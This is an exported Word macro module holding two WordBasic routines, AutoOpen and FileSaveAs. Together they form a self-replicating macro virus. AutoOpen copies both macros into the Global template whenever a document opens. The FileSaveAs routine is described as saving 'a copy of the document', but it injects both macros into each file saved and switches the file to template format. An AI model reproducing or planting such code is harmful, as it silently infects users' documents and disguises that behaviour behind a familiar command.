   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "FileSaveAs"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Saves a copy of the document in a separate file"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSaveAs.MAIN"
   Dim Name_$
   On Error GoTo -1: On Error GoTo exit_
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
   WordBasic.CurValues.FileSaveAs dlg
   WordBasic.Dialog.FileSaveAs dlg
   If dlg.Format = 0 Then dlg.Format = 1
   Name_$ = WordBasic.[FileName$]()
   WordBasic.MacroCopy "Global:FileSaveAs", WordBasic.[FileName$]() + ":FileSaveAs"
   WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen"
   WordBasic.FileSaveAs dlg
   exit_:
   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim Name_$
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
   WordBasic.CurValues.FileSaveAs dlg

   If dlg.Format = 0 Then
   dlg.Format = 1
   Name_$ = WordBasic.[FileName$]()
   WordBasic.MacroCopy "Global:FileSaveAs", WordBasic.[FileName$]() + ":FileSaveAs"
   WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen"
   WordBasic.FileSaveAs dlg
   End If

   WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "Global:AutoOpen"
   WordBasic.MacroCopy WordBasic.[FileName$]() + ":filesaveas", "Global:FileSaveAs"
   End Sub
